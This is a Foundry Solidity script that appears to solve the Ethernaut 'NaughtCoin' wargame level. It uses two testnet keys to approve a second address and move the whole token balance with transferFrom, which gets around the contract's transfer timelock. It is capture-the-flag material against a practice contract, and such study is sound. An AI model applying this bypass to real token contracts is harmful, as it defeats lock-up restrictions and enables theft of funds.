// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {NaughtCoin} from "src/levels/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    error HackFailed();

    function run() external {
        address naughtCoinAddress = vm.envAddress("NAUGHT_COIN_ADDRESS");
        NaughtCoin naughtCoin = NaughtCoin(naughtCoinAddress);

        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        address attacker2 = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_2"));

        uint256 attackerBalance = naughtCoin.balanceOf(attacker);

        // approve other address to spend tokens
        vm.startBroadcast(attacker);
        naughtCoin.approve(attacker2, attackerBalance);
        vm.stopBroadcast();

        // transfer all tokens using approved address
        vm.startBroadcast(attacker2);
        naughtCoin.transferFrom(attacker, attacker2, attackerBalance);
        vm.stopBroadcast();

        console2.log(
            "Attacker balance after hack : ",
            naughtCoin.balanceOf(attacker)
        );
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
